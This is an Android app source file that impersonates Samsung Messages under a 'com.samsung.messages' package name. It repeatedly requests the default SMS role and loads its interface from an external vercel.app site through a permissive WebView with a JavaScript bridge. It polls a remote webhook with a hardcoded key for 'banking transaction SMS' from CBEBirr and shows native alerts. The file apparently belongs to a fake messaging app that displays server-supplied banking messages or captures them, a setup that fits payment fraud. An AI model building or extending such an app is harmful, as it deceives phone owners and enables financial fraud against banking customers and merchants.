package com.samsung.messages.cbe;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.AudioAttributes;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.Settings;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    public static MainActivity instance = null;
    private static final String APP_URL = "https://ramussbirr.vercel.app/messages";
    private static final String CHANNEL_ID = "cbe_messages_channel";
    private static final int ROLE_REQ_CODE = 9001;

    private WebView webView;
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private int lastMessageCount = 0;
    private boolean isDestroyed = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;

        // 1. Initialize Notification Channel with Phone's Default Sound & Vibration
        initNotificationChannel();

        // 2. Request Default SMS App Role matching system screenshot
        checkAndRequestDefaultSms();

        // 3. Initialize WebView for One UI Samsung Messages Experience
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url != null && (url.startsWith("tel:") || url.startsWith("sms:") || url.startsWith("smsto:"))) {
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(intent);
                        return true;
                    } catch (Exception ignored) {}
                }
                return false;
            }
        });

        webView.addJavascriptInterface(new AndroidBridge(this), "Android");
        setContentView(webView);
        webView.loadUrl(APP_URL);

        // 4. Start Real-time Background Polling for Banking SMS
        startRealtimePolling();
    }

    @Override
    protected void onResume() {
        super.onResume();
        instance = this;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isDestroyed = true;
        if (instance == this) {
            instance = null;
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    /**
     * Checks if the app is currently the system Default SMS App.
     * Triggers the exact Android system dialog shown in user's screenshot.
     */
    public void checkAndRequestDefaultSms() {
        // Method A: Android 10+ (API 29+) RoleManager
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                Object roleManager = getSystemService("role");
                if (roleManager != null) {
                    Method isAvailable = roleManager.getClass().getMethod("isRoleAvailable", String.class);
                    Method isHeld = roleManager.getClass().getMethod("isRoleHeld", String.class);
                    String roleSms = "android.app.role.SMS";
                    if (Boolean.TRUE.equals(isAvailable.invoke(roleManager, roleSms))) {
                        if (!Boolean.TRUE.equals(isHeld.invoke(roleManager, roleSms))) {
                            Method createIntent = roleManager.getClass().getMethod("createRequestRoleIntent", String.class);
                            Intent intent = (Intent) createIntent.invoke(roleManager, roleSms);
                            startActivityForResult(intent, ROLE_REQ_CODE);
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // Method B: Standard Telephony ACTION_CHANGE_DEFAULT (KitKat through Android 14)
        try {
            String currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this);
            if (currentDefault == null || !currentDefault.equals(getPackageName())) {
                Intent intent = new Intent(android.provider.Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                intent.putExtra(android.provider.Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
                startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    /**
     * Checks if this app is currently the default SMS app
     */
    public boolean isDefaultSms() {
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                Object roleManager = getSystemService("role");
                if (roleManager != null) {
                    Method isHeld = roleManager.getClass().getMethod("isRoleHeld", String.class);
                    return Boolean.TRUE.equals(isHeld.invoke(roleManager, "android.app.role.SMS"));
                }
            }
            String currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this);
            return getPackageName().equals(currentDefault);
        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Creates system notification channel using the phone's native default notification tone and vibration.
     */
    private void initNotificationChannel() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) {
                    Class<?> channelClass = Class.forName("android.app.NotificationChannel");
                    Constructor<?> ctor = channelClass.getConstructor(String.class, CharSequence.class, int.class);
                    // 4 = IMPORTANCE_HIGH
                    Object channel = ctor.newInstance(CHANNEL_ID, "Messages", 4);

                    // Set channel vibration
                    Method enableVibration = channelClass.getMethod("enableVibration", boolean.class);
                    enableVibration.invoke(channel, true);

                    Method setVibrationPattern = channelClass.getMethod("setVibrationPattern", long[].class);
                    setVibrationPattern.invoke(channel, new Object[]{new long[]{0, 200, 100, 200}});

                    // Use system's default notification sound
                    Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
                    AudioAttributes audioAttributes = new AudioAttributes.Builder()
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .setUsage(AudioAttributes.USAGE_NOTIFICATION_COMMUNICATION_INSTANT)
                        .build();

                    Method setSound = channelClass.getMethod("setSound", Uri.class, AudioAttributes.class);
                    setSound.invoke(channel, defaultSoundUri, audioAttributes);

                    Method createChan = nm.getClass().getMethod("createNotificationChannel", channelClass);
                    createChan.invoke(nm, channel);
                }
            }
        } catch (Exception ignored) {}
    }

    /**
     * Posts a native system notification with phone's default ringtone and vibration.
     */
    public void postNotification(String title, String body) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            PendingIntent pi;
            if (Build.VERSION.SDK_INT >= 23) {
                pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | 0x04000000 /* FLAG_IMMUTABLE */);
            } else {
                pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
            }

            Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);

            Notification.Builder builder = new Notification.Builder(this);
            builder.setContentTitle(title)
                   .setContentText(body)
                   .setSmallIcon(android.R.drawable.sym_action_chat)
                   .setContentIntent(pi)
                   .setAutoCancel(true)
                   .setPriority(Notification.PRIORITY_HIGH)
                   .setSound(defaultSoundUri)
                   .setVibrate(new long[]{0, 200, 100, 200});

            // If Android 8.0+, set channel id via reflection
            if (Build.VERSION.SDK_INT >= 26) {
                try {
                    builder.getClass().getMethod("setChannelId", String.class).invoke(builder, CHANNEL_ID);
                } catch (Exception ignored) {}
            }

            nm.notify((int) System.currentTimeMillis(), builder.build());

            // Also play phone's native sound and vibration
            playSystemSoundAndVibrate();
        } catch (Exception ignored) {}
    }

    public void playSystemSoundAndVibrate() {
        try {
            // Play system notification ringtone (phone's own sound)
            Uri alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), alert);
            if (r != null) {
                r.play();
            }
            // Trigger native phone vibration motor
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                v.vibrate(new long[]{0, 200, 100, 200}, -1);
            }
        } catch (Exception ignored) {}
    }

    /**
     * Polling loop to fetch new messages from webhook and alert immediately
     */
    private void startRealtimePolling() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (!isDestroyed) {
                    try {
                        URL url = new URL("https://ramussbirr.vercel.app/api/sms/webhook?deviceId=dev_galaxy_a12");
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setConnectTimeout(4000);
                        conn.setReadTimeout(4000);
                        conn.setRequestProperty("x-api-key", "Ram69");

                        if (conn.getResponseCode() == 200) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder sb = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                sb.append(line);
                            }
                            reader.close();

                            String json = sb.toString();
                            int countIdx = json.indexOf("\"count\":");
                            if (countIdx != -1) {
                                int endIdx = json.indexOf(",", countIdx);
                                if (endIdx == -1) endIdx = json.indexOf("}", countIdx);
                                if (endIdx != -1) {
                                    String countStr = json.substring(countIdx + 8, endIdx).trim();
                                    int count = Integer.parseInt(countStr);
                                    if (lastMessageCount > 0 && count > lastMessageCount) {
                                        // New transaction SMS detected!
                                        mHandler.post(new Runnable() {
                                            @Override
                                            public void run() {
                                                postNotification("CBEBirr", "New banking transaction SMS received");
                                                if (webView != null) {
                                                    webView.reload();
                                                }
                                            }
                                        });
                                    }
                                    lastMessageCount = count;
                                }
                            }
                        }
                        conn.disconnect();
                    } catch (Exception ignored) {}

                    try {
                        Thread.sleep(2500);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }
        }).start();
    }

    /**
     * JavaScript Interface Bridge for Web App
     */
    public class AndroidBridge {
        private Context mContext;

        public AndroidBridge(Context ctx) {
            this.mContext = ctx;
        }

        @JavascriptInterface
        public boolean isDefaultSms() {
            return MainActivity.this.isDefaultSms();
        }

        @JavascriptInterface
        public void requestDefaultSms() {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    checkAndRequestDefaultSms();
                }
            });
        }

        @JavascriptInterface
        public void notify(final String title, final String body) {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    postNotification(title, body);
                }
            });
        }

        @JavascriptInterface
        public void vibrate() {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    playSystemSoundAndVibrate();
                }
            });
        }

        @JavascriptInterface
        public String getDeviceId() {
            return "dev_galaxy_a12";
        }
    }
}
